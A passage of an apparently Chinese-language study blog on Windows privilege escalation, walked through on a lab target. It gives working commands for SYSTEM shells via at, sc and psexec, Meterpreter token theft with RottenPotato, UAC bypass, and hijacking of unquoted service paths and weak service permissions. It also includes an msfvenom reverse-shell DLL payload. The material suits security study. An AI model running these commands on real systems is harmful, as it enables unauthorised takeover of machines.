class="hljs-string">&quot;命令执行模块发生错误&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(out)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Deduplication</span><span class="hljs-params">(lines []<span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">string</span> &#123;<br>m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> result []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, line := <span class="hljs-keyword">range</span> lines &#123;<br><span class="hljs-keyword">if</span> !m[line] &#123;<br>result = <span class="hljs-built_in">append</span>(result, line)<br>m[line] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> result<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadCsv</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">string</span> &#123;<br>file, err := os.Open(path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;文件文件打开错误:&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br>reader := csv.NewReader(file)<br>all, err := reader.ReadAll()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;CSV读取发生错误:&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">var</span> subdomains []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">len</span>(all); i++ &#123;<br><span class="hljs-keyword">if</span> strings.Contains(all[i][<span class="hljs-number">7</span>], <span class="hljs-string">&quot;Privilege&quot;</span>) &#123;<br>subdomains = <span class="hljs-built_in">append</span>(subdomains, all[i][<span class="hljs-number">1</span>])<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> Deduplication(subdomains)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>exp := <span class="hljs-string">&quot;exp&quot;</span><br>cve := <span class="hljs-string">&quot;cve.csv&quot;</span><br>fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,<span class="hljs-string">&quot;start ....&quot;</span>)<br>dir,_ := os.Getwd()<br><span class="hljs-keyword">var</span> YesEXP,NoEXP []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ReadCsv(cve) &#123;<br>path := Cmd(<span class="hljs-string">&quot;find&quot;</span>, exp, <span class="hljs-string">&quot;-name&quot;</span>, v)<br>path = strings.TrimRight(path,<span class="hljs-string">&quot;\n&quot;</span>)<br>path = strings.Replace(path,<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot; | &quot;</span>+dir+<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> v != <span class="hljs-string">&quot;&quot;</span>&#123;<br><span class="hljs-keyword">if</span> path != <span class="hljs-string">&quot;&quot;</span>&#123;<br>YesEXP = <span class="hljs-built_in">append</span>(YesEXP,v+<span class="hljs-string">&quot; --&gt; &quot;</span>+dir+<span class="hljs-string">&quot;/&quot;</span>+path)<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>NoEXP = <span class="hljs-built_in">append</span>(NoEXP,v)<br>&#125;<br>&#125;<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;YesEXP:&quot;</span>,<span class="hljs-built_in">len</span>(YesEXP))<br><span class="hljs-keyword">for</span> _,v := <span class="hljs-keyword">range</span> YesEXP&#123;<br>fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;NoEXP:&quot;</span>,<span class="hljs-built_in">len</span>(NoEXP))<br><span class="hljs-keyword">for</span> _,v := <span class="hljs-keyword">range</span> NoEXP&#123;<br>fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;[+]&quot;</span>,<span class="hljs-string">&quot;Bye&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AT-amp-SC-amp-PS"><a href="#AT-amp-SC-amp-PS" class="headerlink" title="AT&amp;SC&amp;PS"></a>AT&amp;SC&amp;PS</h2><p>AT&amp;SC&amp;PS命令提权的原理大致相同，系统执行一些任务、服务…时，会默认调用system权限，从而导致权限提升。</p><table><thead><tr><th align="center">命令</th><th align="center">作用</th><th align="center">使用版本</th></tr></thead><tbody><tr><td align="center">at</td><td align="center">计划任务</td><td align="center">2000&#x2F;2003&#x2F;XP</td></tr><tr><td align="center">sc</td><td align="center">服务控制</td><td align="center">7&#x2F;8&#x2F;2003&#x2F;2012&#x2F;2016&#x2F;2019</td></tr><tr><td align="center">psexec</td><td align="center">远程执行进程</td><td align="center">同上</td></tr></tbody></table><p>注：交互式的cmd窗口无法生成时，可以执行后门来反弹shell，可能只是无法执行交互式的任务，而不是无法执行。</p><h3 id="1-利用-1"><a href="#1-利用-1" class="headerlink" title="1.利用"></a>1.利用</h3><h4 id="1-at"><a href="#1-at" class="headerlink" title="1.at"></a>1.at</h4><p>计划命令，默认调用system权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">at 21:00 /interactive cmd<span class="hljs-comment"># 21:00生成一个交互式的System权限的cmd窗口</span><br></code></pre></td></tr></table></figure><h4 id="2-sc"><a href="#2-sc" class="headerlink" title="2.sc"></a>2.sc</h4><p>用于服务控制管理器和服务进行通信的命令行程序，功能类似于控制面板中管理工具项中的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc Create syscmd binPath=<span class="hljs-string">&quot;cmd /K start&quot;</span> <span class="hljs-built_in">type</span>=own <span class="hljs-built_in">type</span>=interact<br>sc start syscmd<span class="hljs-comment"># 运行服务</span><br></code></pre></td></tr></table></figure><h4 id="3-psexec"><a href="#3-psexec" class="headerlink" title="3.psexec"></a>3.psexec</h4><p>pstools：微软官方的一个工具包</p><p>pstools：<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>psexec：pstools 中一个可以执行进程的工具</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208103110277.png" alt="image-20230208103110277"></p><p>利用 psexec 进行提权。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> -accepteula -s -<span class="hljs-selector-tag">i</span> -d cmd.exe<br></code></pre></td></tr></table></figure><h3 id="2-实操-1"><a href="#2-实操-1" class="headerlink" title="2.实操"></a>2.实操</h3><h4 id="1-sc"><a href="#1-sc" class="headerlink" title="1.sc"></a>1.sc</h4><p>目标：windows server 2012</p><p>执行交互式的cmd服务失败，根据警告发现可能是交互式的问题：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208094012192.png" alt="image-20230208094012192"></p><p>那么就利用sc执行msf后门，成功：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> Create sysmsf binPath=<span class="hljs-string">&quot;C:\Users\Administrator\Desktop\shell.exe&quot;</span> <span class="hljs-built_in">type</span>=own<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> sysmsf<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208102053587.png" alt="image-20230208102053587"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208102018939.png" alt="image-20230208102018939"></p><h4 id="2-psexec"><a href="#2-psexec" class="headerlink" title="2.psexec"></a>2.psexec</h4><p>下载pstools，将psexec上传到目标。</p><p>弹cmd窗口：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104656413.png" alt="image-20230208104656413"></p><p>弹shell：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104812952.png" alt="image-20230208104812952"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104825955.png" alt="image-20230208104825955"></p><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><h3 id="1-利用-2"><a href="#1-利用-2" class="headerlink" title="1.利用"></a>1.利用</h3><p>适用版本：2008&#x2F;2012&#x2F;2016&#x2F;2019</p><p>原理：将后门注入到system权限进程下，线程继承了system进程的权限，实现权限提升。</p><p>使用工具：MSF、pinjector(仅适用于2008之前的版本，这里就不使用了)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps# 查看进程<br>migrate 180# 迁移到PID为180的进程<br></code></pre></td></tr></table></figure><h3 id="2-实操-2"><a href="#2-实操-2" class="headerlink" title="2.实操"></a>2.实操</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps<br>migrate 3060<br>getuid<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208113756969.png" alt="image-20230208113756969"></p><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌窃取一般使用于本地用户，不过在于烂土豆漏洞配合的情况下，可以从<strong>服务权限</strong> (仅适用于服务权限) 进行提权。</p><h3 id="1-利用-3"><a href="#1-利用-3" class="headerlink" title="1.利用"></a>1.利用</h3><p>适用版本：2003&#x2F;2008&#x2F;2012&#x2F;2016&#x2F;2019</p><p>使用工具：MSF</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> incognito<br>list_tokens -u<br>impersonate_token <span class="hljs-string">&quot;令牌&quot;</span><br></code></pre></td></tr></table></figure><p>烂土豆配合令牌窃取提权：</p><p>烂土豆是溢出漏洞，令牌窃取适用于本地权限提升，可以使用烂土豆和令牌窃取进行配合实现<strong>webshell</strong>的权限提升。</p><p>适用条件：</p><ol><li>烂土豆未打补丁</li><li>当前权限为<strong>服务权限</strong>，而非本地用户</li></ol><p>MS16-075 RottenPotato原理：</p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p><strong>RottenPotato</strong>下载：</p><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li><li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li><li><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">执行烂土豆EXP</span><br>execute -cH -f potato.exe<br><span class="hljs-meta prompt_"># </span><span class="language-bash">令牌窃取</span><br>use incognito<br>list_tokens -u<br>impersonate_token &quot;令牌&quot;<br></code></pre></td></tr></table></figure><h3 id="2-实操-3"><a href="#2-实操-3" class="headerlink" title="2.实操"></a>2.实操</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">getuid<br><span class="hljs-keyword">use</span> incognito<br>list_tokens -u<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208115110564.png" alt="image-20230208115110564"></p><h2 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h2><h3 id="1-利用-4"><a href="#1-利用-4" class="headerlink" title="1.利用"></a>1.利用</h3><p>getsystem 是MSF中针对windows管理员组用户的一个自动提权模块，其使用条件为：</p><ol><li>管理员组的成员</li><li>UAC：<ol><li>非最高等级：MSF内置模块，UACME 进行绕过</li><li>最高等级：使用MSF ask模块，会给目标弹出一个UAC的框，用户确定后，即可绕过UAC提权</li></ol></li></ol><p>查看当前用户是否属于管理员组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup Administrators# 查看本地管理员组成员<br>whoami# 查看当前用户名<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214212026690.png" alt="image-20230214212026690"></p><p>UAC -&gt; 用户账户控制</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212193308387.png" alt="image-20230212193308387"></p><p>BypassUAC：</p><ol><li>MSF 内置模块</li><li>UACME 工具</li></ol><p>MSF：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212215054023.png" alt="image-20230212215054023"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/bypassuac<br>use exploit/windows/local/ask<span class="hljs-comment"># 询问模式</span><br></code></pre></td></tr></table></figure><p>UACME：<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">akagi64 61 shell.exe<span class="hljs-comment"># 使用第61模式去执行后门，然后使用getsystem进行提权</span><br></code></pre></td></tr></table></figure><h3 id="2-实操-4"><a href="#2-实操-4" class="headerlink" title="2.实操"></a>2.实操</h3><h4 id="1-无UAC"><a href="#1-无UAC" class="headerlink" title="1.无UAC"></a>1.无UAC</h4><p>查看当前用户是否属于管理员组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup Administrators<span class="hljs-comment"># 查看管理员组成员</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212200939237.png" alt="image-20230212200939237"></p><p>当前用户 <code>admin </code>在管理员组中，可以使用 <code>getsystem</code> 进行提权，直接提权成功。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212201031688.png" alt="image-20230212201031688"></p><h4 id="2-BypassUAC"><a href="#2-BypassUAC" class="headerlink" title="2.BypassUAC"></a>2.BypassUAC</h4><p>UAC -&gt; 默认，第三级</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212193944834.png" alt="image-20230212193944834"></p><p>提权尝试 -&gt; 失败</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212194138937.png" alt="image-20230212194138937"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/bypassuac<span class="hljs-comment"># MSF中内置的BypassUAC模块</span><br><span class="hljs-built_in">set</span> ...<br>run<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212214811475.png" alt="image-20230212214811475"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getsystem</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212214847628.png" alt="image-20230212214847628"></p><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="1-利用-5"><a href="#1-利用-5" class="headerlink" title="1.利用"></a>1.利用</h3><p>DLL介绍：</p><ol><li>DLL：动态链接库</li><li>DLL 是一个包含可由多个程序同时使用的代码和数据的库。</li></ol><p>DLL劫持提权：</p><ol><li><p>在程序运行后，就需要从DLL中加载其需要使用的代码，根据这个特性，我们将某个DLL替换为一个包含后门的DLL文件，在这个程序运行时，就会自动加载这个DLL文件，从而触发后门代码，使我们成功得到一个shell。</p></li><li><p>DLL劫持具体获取的权限一般取决于<strong>运行此程序时用户的权限</strong>，一般是管理员组的用户，这时再使用MSF的<code>getsystem</code>或者其他方式继续提升到<code>system</code> 权限。</p></li></ol><p>使用工具：</p><ol><li>DLL分析：WinDbg、火绒剑</li><li>DLL劫持验证：ChkDllHijack </li><li>DLL后门生成：MSF</li></ol><p>工具下载：</p><ol><li>WinDebug：<a href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi">http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi</a></li><li>ChkDllHijack：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></li></ol><p>工具使用：</p><p>WinDebug：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213232945032.png" alt="image-20230213232945032"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233019826.png" alt="image-20230213233019826"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233040579.png" alt="image-20230213233040579"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233509662.png" alt="image-20230213233509662"></p><p>ChkDllHijack：</p><p>把WinDebug的dll复制到这里，再选择好目标exe文件。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233706067.png" alt="image-20230213233706067"></p><p>这个工具会一直测试dll文件(一直启动目标程序)，最后会显示出可以替换的dll文件：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213234055666.png" alt="image-20230213234055666"></p><p>MSF生成DLL后门：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.67.140 <span class="hljs-attribute">lport</span>=12345 -f dll &gt; libeay32.dll<br></code></pre></td></tr></table></figure><h3 id="2-实操-5"><a href="#2-实操-5" class="headerlink" title="2.实操"></a>2.实操</h3><p>目标机器上有flashfxp，本地安装一下。</p><p>使用WinDebuy启动软件，查看其dll调用情况。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213213007743.png" alt="image-20230213213007743"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213220818574.png" alt="image-20230213220818574"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213224207793.png" alt="image-20230213224207793"></p><p>这里使用<code>libeay32.dll</code>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.67.140 <span class="hljs-attribute">lport</span>=12345 -f dll &gt; libeay32.dll<br></code></pre></td></tr></table></figure><p>这个测试没有成功，的确调用了dll文件，但是无法反弹shell。</p><h2 id="服务路径"><a href="#服务路径" class="headerlink" title="服务路径"></a>服务路径</h2><h3 id="1-利用-6"><a href="#1-利用-6" class="headerlink" title="1.利用"></a>1.利用</h3><p>其根本原理还是系统调用服务时默认会以system权限去运行，导致权限提升。</p><p>原理：当服务路径 <strong>不带引号</strong> 且 <strong>路径中存在空格</strong> 时，可以将其看作 [命令][空格][参数] 的形式，上传一个与 [命令] 同名的exe文件，当服务启动后，会运行 [命令]，而在windows中exe文件可以不加后缀就执行，导致服务启动时执行了我们上传的EXE文件，实现了权限提升。</p><p>带引号和不带引号的区别：</p><p><code>&quot;C:\Program Files\Everything\Everything.exe&quot;</code>：表示的是一个命令整体</p><p><code>C:\Program Files\Everything\Everything.exe</code>：由于 <code>C:\Program</code> 后有空格，则表示为 <code>C:\Program</code> 是命令，而<code>Files\Everything\Everything.exe </code>是 <code>C:\Program  </code>命令的参数</p><p>运行后如下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213121142976.png" alt="image-20230213121142976"></p><p>使用 wmic 检查不带引号的服务路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span>|findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>使用 sc 命令启动服务：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> [<span class="hljs-type">displayname</span>]<br></code></pre></td></tr></table></figure><p>利用流程：</p><ol><li>使用wmic寻找不安全的服务路径</li><li>制作同名的后门，上传到指定位置</li><li>启动监听，重启服务</li></ol><h3 id="2-实操-6"><a href="#2-实操-6" class="headerlink" title="2.实操"></a>2.实操</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span>|findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213211052896-16762938548401.png" alt="image-20230213211052896"></p><p>发现phpStudySrv服务路径不带引号且路径中存在空格，那么就修改后门名为 <code>Program.exe</code>，上传到 <code>C:\</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>Program.exe C:/<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213211526717.png" alt="image-20230213211526717"></p><p>启动新的MSF监听，启动服务，提权成功：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> phpStudySrv<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213212351569.png" alt="image-20230213212351569"></p><h2 id="服务权限"><a href="#服务权限" class="headerlink" title="服务权限"></a>服务权限</h2><h3 id="1-利用-7"><a href="#1-利用-7" class="headerlink" title="1.利用"></a>1.利用</h3><p>原理：某些服务可以权限设置不恰当，导致可以被低权限的用户修改其服务路径，从而直接将服务路径指向后门文件，导致权限提升。</p><p>使用工具：accesschk</p><p>工具介绍：微软官方的 windows系统配置检查工具，用于查看文件、注册表项、服务、进程、内核对象等的有效权限。<strong>该工具将有助于识别当前用户是否可以修改某个服务目录中的文件。</strong>我们可以使用该工具查看当前用户可以修改的服务。</p><p>accesschk：<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula# 接收许可<br>accesschk.exe -uwcqv &quot;fuming&quot; * # 查看用户fuming可以修改的服务<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214220937763.png" alt="image-20230214220937763"></p><p>RW 就代表着可以读写。RW后面跟的就是是服务名。</p><p>之后就是修改服务路径，启动服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sc stop [服务名]<br>sc config [服务名] binPath= [可执行文件路径]<br>sc start [服务名]<br></code></pre></td></tr></table></figure><h3 id="2-实操-7"><a href="#2-实操-7" class="headerlink" title="2.实操"></a>2.实操</h3><p>上传 accesschk：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">pwd<br>upload <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>accesschk.exe C:\\Users\\Administrator\\Desktop<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222451668.png" alt="image-20230214222451668"></p><p>运行 accesschk，查看是否可以修改服务路径：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">execute -if accesschk.exe -a &quot;/accepteula&quot;# 添加许可<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222748510.png" alt="image-20230214222748510"></p><p>查看当前用户可以修改的服务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">getuid <br>execute -<span class="hljs-keyword">if</span> accesschk.exe -a <span class="hljs-string">&quot;-uwcqv &quot;</span>Administrato<span class="hljs-string">r&quot; *&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222938995.png" alt="image-20230214222938995"></p><p>替换服务指向路径，路径设置为MSF的后门程序：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>stop Appinfo<br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> Appinfo <span class="hljs-keyword">binPath= </span><span class="hljs-string">&quot;C:\Users\Administrator\Desktop\shell.exe&quot;</span><br><span class="hljs-keyword">sc </span>start Appinfo<br></code></pre></td></tr></table></figure><p>修改后，启动MSF监听，启动服务，提权成功。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214223402301.png" alt="image-20230214223402301"></p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>使用工具：</p><ol><li>MSF</li><li>Navicat</li></ol><h3 id="1-MySql"><a href="#1-MySql" class="headerlink" title="1.MySql"></a>1.MySql</h3><p>前提条件：</p><ol><li>root 用户 -&gt; 文件写入的权限</li><li>secure_file_priv为空 -&gt; 文件写入位置不受限制</li></ol><h4 id="1-udf提权"><a href="#1-udf提权" class="headerlink" title="1.udf提权"></a>1.udf提权</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><p>udf -&gt; user defined function -&gt; 用户自定义函数</p><p>udf 提权就是用户定义了一个执行命令的函数从而实现系统命令的执行。</p><p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p><p>udf 在mysql5.1以后的版本中，存放于’mysql&#x2F;lib&#x2F;plugin’目录下。5.1 之前 c:\windows\system32 。</p><h5 id="2-条件"><a href="#2-条件" class="headerlink" title="2.条件"></a>2.条件</h5><ol><li>root账户</li><li>secure_file_priv为空</li></ol><h5 id="3-开启外连"><a href="#3-开启外连" class="headerlink" title="3.开启外连"></a>3.开启外连</h5><p>MySql默认情况下是不允许外部远程连接root用户的，所以需要先使用webshell、Navicat HTTP通道、phpmyadmin等方式开启外连。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> <span 